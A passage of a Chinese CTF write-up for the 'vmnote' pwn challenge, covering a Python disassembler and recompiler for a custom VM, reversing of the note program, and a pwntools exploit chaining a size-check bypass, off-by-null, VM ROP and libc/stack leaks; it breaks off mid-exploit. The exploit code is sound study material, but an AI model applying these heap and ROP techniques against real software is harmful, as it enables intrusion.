        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>pc <span class="token operator">+=</span> <span class="token number">1</span>
            var <span class="token operator">=</span> self<span class="token punctuation">.</span>opcode<span class="token punctuation">[</span>self<span class="token punctuation">.</span>pc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>pc <span class="token operator">+=</span> <span class="token number">2</span>
            var <span class="token operator">=</span> u16<span class="token punctuation">(</span>self<span class="token punctuation">.</span>opcode<span class="token punctuation">[</span>self<span class="token punctuation">.</span>pc <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>pc<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>pc <span class="token operator">+=</span> <span class="token number">4</span>
            var <span class="token operator">=</span> u32<span class="token punctuation">(</span>self<span class="token punctuation">.</span>opcode<span class="token punctuation">[</span>self<span class="token punctuation">.</span>pc <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>pc<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>pc <span class="token operator">+=</span> <span class="token number">8</span>
            var <span class="token operator">=</span> u64<span class="token punctuation">(</span>self<span class="token punctuation">.</span>opcode<span class="token punctuation">[</span>self<span class="token punctuation">.</span>pc <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>pc<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> var
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>然后后续分析会遇到函数调用, 分为直接调用地址, 还是根据寄存器去调用两种情况.</p> <p><img src="https://i.loli.net/2021/07/28/mkDj4fJ5XULhsp8.png" alt="image-20210728202650801"></p> <p>往下是test指令, 两个寄存器&amp;运算,只修改eflag寄存器值,</p> <p><img src="https://i.loli.net/2021/07/28/9m4scXeKEv3auWB.png" alt="image-20210728202904259"></p> <p>然后是jmp系列指令,  根据flag标识不同跳转,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>    <span class="token keyword">def</span> <span class="token function">jmp</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
        target <span class="token operator">=</span> self<span class="token punctuation">.</span>fetch<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>asmcode <span class="token operator">+=</span> <span class="token string">&quot;jmp _{:04x}\n&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>asmcode <span class="token operator">+=</span> <span class="token string">&quot;jz _{:04x}\n&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>asmcode <span class="token operator">+=</span> <span class="token string">&quot;jnz _{:04x}\n&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>asmcode <span class="token operator">+=</span> <span class="token string">&quot;jl _{:04x}\n&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>asmcode <span class="token operator">+=</span> <span class="token string">&quot;jg _{:04x}\n&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>然后后续指令差不太多, 运算指令基本都是基于寄存器的, 然后flag位置标识运算数据大小,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>    <span class="token comment"># xor reg, {reg/number}</span>
    <span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
            reg1 <span class="token operator">=</span> self<span class="token punctuation">.</span>get_reg<span class="token punctuation">(</span><span class="token punctuation">)</span>
            number <span class="token operator">=</span> self<span class="token punctuation">.</span>fetch<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>asmcode <span class="token operator">+=</span> <span class="token string">&quot;xor {}, 0x{:08x}\n&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>reg1<span class="token punctuation">,</span> number<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            reg1 <span class="token operator">=</span> self<span class="token punctuation">.</span>get_reg<span class="token punctuation">(</span><span class="token punctuation">)</span>
            reg2 <span class="token operator">=</span> self<span class="token punctuation">.</span>get_reg<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>asmcode <span class="token operator">+=</span> <span class="token string">&quot;xor {}, {}\n&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>reg1<span class="token punctuation">,</span> reg2<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>其他的差不多, 基本都可以写出来, 完整脚本在github和文末,</p> <p>程序中比较有意思的还有个opcode 0x19, 其中通过寄存器0判断运行什么指令, 是实现了一个系统调用的操作, 直接写为<code>syscall</code>即可,</p> <h3 id="vm重编译"><a href="#vm重编译" class="header-anchor">#</a> vm重编译</h3> <p>我们可以将整个opcode翻译为大致的x86指令后, 开始优化代码并重编译,</p> <p>先简单说下重编译, 我们的到的汇编代码在<code>self.asmcode</code>, 可以直接用pwntool里的asm编译出来字节码,然后写入到文件中.</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>    <span class="token keyword">def</span> <span class="token function">recompile</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
        buf <span class="token operator">=</span> self<span class="token punctuation">.</span>asmcode
        code <span class="token operator">=</span> asm<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
        <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>以下是关于优化的问题,</p> <p>这里有几个指令其实不好处理, <code>print</code>, <code>input</code>, <code>exit</code></p> <p>这里我的做法是这样的, 在汇编代码最后将这几个单独写为一个函数, 然后对应handler就直接写为<code>call _xxx</code>,</p> <blockquote><p>这个做法其实有个问题, 主要是ida太智能吧, 如果你这个函数是个死循环之类的, 后面的在反编译会认为是两段, 一开始我吧这几个函数写为死循环就遭遇了这个问题, 后面换成了<code>mov rax,xx; ret</code>就ok了,</p></blockquote> <p>然后另一个问题是vmnote内的寄存器规则和x86使用寄存器规则不一样,</p> <p>主要是函数调用参数是r1, r2, 返回值是r1, 于是这里我设置r1=rdi, r2=rsi, 在ret之前加一句<code>mov rax, rdi</code>保证ida可以识别到返回值, call运行以后跟一句<code>mov rdi, rax</code>保证后面的程序正常运行,</p> <p>于是基本可以重编译出来一个新文件, 放到ida中, 编译器设置为gun c++即可,</p> <h3 id="note-bin逆向"><a href="#note-bin逆向" class="header-anchor">#</a> note.bin逆向</h3> <p>我直接写入文件了, 因此从地址00开始运行, start函数如下:</p> <p><img src="https://i.loli.net/2021/07/28/ILYl8JsFygmDkzq.png" alt="image-20210728205551187"></p> <p>init函数主要是解密字符串, 通过系统调用实现了time和设置随机数种子,</p> <p><img src="https://i.loli.net/2021/07/28/VxuygQsFkwniGaT.png" alt="image-20210728205800309"></p> <p>这里的解密其实就是异或, 我们也可以简单的完成:</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>    <span class="token keyword">def</span> <span class="token function">string_decode</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> index<span class="token punctuation">,</span> var<span class="token punctuation">)</span><span class="token punctuation">:</span>
        arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        xor <span class="token operator">=</span> <span class="token number">0</span>
        i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            xor <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>data<span class="token punctuation">[</span>index <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token operator">-</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> var
            <span class="token keyword">if</span> xor<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xor<span class="token punctuation">)</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><img src="https://i.loli.net/2021/07/28/FtEcoDMbJ6NVC9w.png" alt="image-20210728205934324"></p> <p>在<code>set1_check</code>函数中就是提示输入, 然后进入check函数</p> <p><img src="https://i.loli.net/2021/07/28/DAETfKGaOYkHrWZ.png" alt="image-20210728210003015"></p> <p>其中先校验长度大于17, 前17字节进入funccheck, 后面的部分和打印给出的随机数相差<code>0x12345678</code>,</p> <p><img src="https://i.loli.net/2021/07/28/fy67IoXgNbW1BPm.png" alt="image-20210728210217119"></p> <p><img src="https://i.loli.net/2021/07/28/ApvlsFmMPz2VQYh.png" alt="image-20210728210243914"></p> <p>这一段的解密:</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>    check <span class="token operator">=</span> vm<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x120</span><span class="token punctuation">:</span><span class="token number">0x120</span><span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">]</span>
    data <span class="token operator">=</span> vm<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x1f</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span>check<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token comment"># b'01d_6u7_v190r0u5_'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="堆部分"><a href="#堆部分" class="header-anchor">#</a> 堆部分</h3> <p>接下来进入note.bin的堆部分, 实现了个菜单, 有add, dele, show三种功能, 在data中通过数组储存, 三种功能的实现都是通过系统调用在vmnote内实现的,</p> <p>对应的位置在这里opcode 0x19号, syscall位置,</p> <p><img src="https://i.loli.net/2021/07/29/EozegYFxIP2nTUv.png" alt="image-20210729091419764"></p> <p>其中在note.bin中使用数组维护chunk_list, 在vmnote中, 也使用一个单项链表维护堆块列表, 可以在<code>add_heap</code>中看到详细代码,</p> <p><img src="https://i.loli.net/2021/07/29/mFcyrAkSpvo9TWH.png" alt="image-20210729091531382"></p> <p>其中记录size的位置在edit功能会检查堆块大小,</p> <h2 id="利用"><a href="#利用" class="header-anchor">#</a> 利用</h2> <p>首先在程序中找到相关漏洞.</p> <h3 id="漏洞"><a href="#漏洞" class="header-anchor">#</a> 漏洞</h3> <p>第一个是syscall 6,实现了edit功能, 在对应的<code>check_size</code>函数传入的参数的Dword类型,但是后续使用的read位置是QWORD类型, 这里可以通过伪造数据绕过<code>check_size</code>, 实现一个堆溢出向后覆写</p> <p><img src="https://i.loli.net/2021/07/29/8BcMm7xZe2W4aiD.png" alt="image-20210729092954390"></p> <p>第二个漏洞在note.bin中, 在堆上的一个off by null.</p> <p><img src="https://i.loli.net/2021/07/29/8ILSetupkQnw3E6.png" alt="image-20210729093102425"></p> <p><img src="https://i.loli.net/2021/07/29/BH2ptV317AGfWUQ.png" alt="image-20210729093127037"></p> <h3 id="vm-rop"><a href="#vm-rop" class="header-anchor">#</a> vm rop</h3> <p>首先能控制操作流程的是这个位置的栈上的off by null, 可以修改掉ebp的最低位, 概率性跳转到前面的输入中, 这里构造一个vm中的rop, 借助我们前面脚本生成的反汇编代码可以轻松完成.</p> <p>可以利用的是以下位置, 可以控制两个参数, 并调用这个read函数,</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>_0x6ca: pop rdi
_0x6cc: pop rsi
_0x6ce: mov rax, rdi
		ret
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><blockquote><p>调试略显麻烦, 断点下在leave和ret的handler位置吧,</p></blockquote> <p>然后返回地址, 先返回read_number函数, 这里有一次leave+ret, 因为我们修改的是ebp因此还需要一次leave+ret, 那么使用show功能内的<code>read_number</code>函数触发, 返回时就又有一层show函数的leave+ret,</p> <p>此时如果成功, 则会在这里, 概率性的返回到我们输入的数据上,</p> <p><img src="https://i.loli.net/2021/07/29/ju9GRDlwpFBPJMe.png" alt="image-20210729102030657"></p> <p>这里的rop思路大概就是设置俩寄存器以后跳到read就好, size可以设置为0x1000一个大的数据就好, 另一个数据是一个在stack中的索引值, 这个不好找,</p> <p>因为概率性跳转到不定位置, 因此我们在前面输入大量ret作为滑板, 同时, 在leave语句中这个滑板会赋值给ebp,</p> <p>其实我们使用漏洞修改了ebp低位为00, 然后在show中激活漏洞确保两次leave栈迁移向上了几位, 此时ebp值又被修改, 我们可以leave再赋值给esp, 栈迁移到这个位置, 同时这个地址我们知道, 也就可以构造rop向其中写入数据, 然后leave,</p> <p>经过调试, 我们可以在内存中找到我们的数据,</p> <p><img src="https://i.loli.net/2021/07/29/KqnJX9soGPFvLUy.png" alt="image-20210729105714242"></p> <p>同时, 这个思路可行,</p> <p><img src="https://i.loli.net/2021/07/29/HYSwaZGftNpKJs4.png" alt="image-20210729110106361"></p> <p>然后栈迁移到了0x65b位置,</p> <blockquote><p>需要注意的是leave的运行, 首先设置rsp, 然后pop出rbp,</p> <p>因此leave的是后, rsp=rbp=0x653, 然后pop, rbp=[0x653]=0, rsp=0x653+8</p> <p>后续我们再次leave, rsp=0, 此后我们向0+8地址写入rop, 并最后写入leave, 这样运行完一段rop后rsp会重回0地址, 然后再次运行下一段,</p></blockquote> <p>但是这里是概率性爆破, 在此处设置为exp1, 并打印出一个字符串作为成功标识,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">exp1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    change<span class="token punctuation">(</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> pop<span class="token punctuation">,</span> <span class="token number">0x65b</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> read<span class="token punctuation">,</span> leave<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;choice&gt;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;2&quot;</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">&quot;idx:&quot;</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>pop<span class="token punctuation">,</span> strchange<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> printf<span class="token punctuation">,</span> pop <span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span>  read<span class="token punctuation">,</span> leave<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">&quot;challenge&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./rbin&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        exp1<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            cn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;none&quot;</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>然后根据这个机制写了个这个函数, arr就是rop链, 然后number指定下一次的地址,其实可以0/0x500 反复跳, 因为担心正在运行的rop被修改,因此每次不能都写0,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">rop</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> number<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> flat<span class="token punctuation">(</span>number<span class="token punctuation">,</span> arr<span class="token punctuation">,</span> pop<span class="token punctuation">,</span> number<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> read<span class="token punctuation">,</span> leave<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>可以多次rop:</p> <p><img src="https://i.loli.net/2021/07/29/chRsfUzN3XvMPEJ.png" alt="image-20210729112016019"></p> <h3 id="堆部分-2"><a href="#堆部分-2" class="header-anchor">#</a> 堆部分</h3> <p>堆的漏洞主要是在edit的时候伪造size实现堆溢出,</p> <p>但是在vm内并没办法使用完整功能, 限制也比较多, 我们可以rop以后, 可以使用rop重写一下几个syscall, 得到完整的功能</p> <p>然后思路大体就是, 借助堆溢出, 修改vmnote中单向链表中的node, 基本可以实现一个任意地址读写, 通过unsortedbin的大堆块泄漏libc, 然后打印environ地址,得到栈地址, 通过libc中的syscall ret完成orw的rop,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">exp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload  <span class="token operator">=</span> rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> chunk_list<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> printf<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    heap <span class="token operator">=</span> heap <span class="token operator">-</span> <span class="token number">0x480</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    heap1 <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x480</span> 
    heap2 <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x4d0</span>

    
    <span class="token keyword">def</span> <span class="token function">my_new</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> syscall3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">my_dele</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> syscall4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">my_show</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> syscall7<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">my_edit</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>rop<span class="token punctuation">(</span><span class="token punctuation">[</span>pop<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> size<span class="token punctuation">,</span> syscall6<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    my_new<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span>
    heap3 <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x520</span>
    my_dele<span class="token punctuation">(</span>heap3<span class="token punctuation">)</span>

    my_edit<span class="token punctuation">(</span>heap1<span class="token punctuation">,</span> <span class="token number">0x100000004</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> heap3<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    my_show<span class="token punctuation">(</span>heap3<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">&quot;ontent: &quot;</span><span class="token punctuation">)</span>
    main_aeran <span class="token operator">=</span> u64<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_aeran<span class="token punctuation">)</span><span class="token punctuation">)</span>
    LIBC <span class="token operator">=</span> main_aeran <span class="token operator">-</span> <span class="token number">0x1ebbe0</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>LIBC<span class="token punctuation">)</span><span class="token punctuation">)</span>
    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./libc.so.6&quot;</span><span class="token punctuation">)</span>
    env <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span> <span class="token operator">+</span> LIBC 


    my_edit<span class="token punctuation">(</span>heap2<span class="token punctuation">,</span> <span class="token number">0x100000004</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> env<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    my_show<span class="token punctuation">(</span>env<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">&quot;ontent: &quot;</span><span class="token punctuation">)</span>
    stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>

    stack <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x140</span> 

    my_new<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>
    heap4 <span class="token operator">=</span> heap3

    my_edit<span class="token punctuation">(</span>heap4<span class="token punctuation">,</span> <span class="token number">0x100000004</span><span class="token punctuation">)</span>
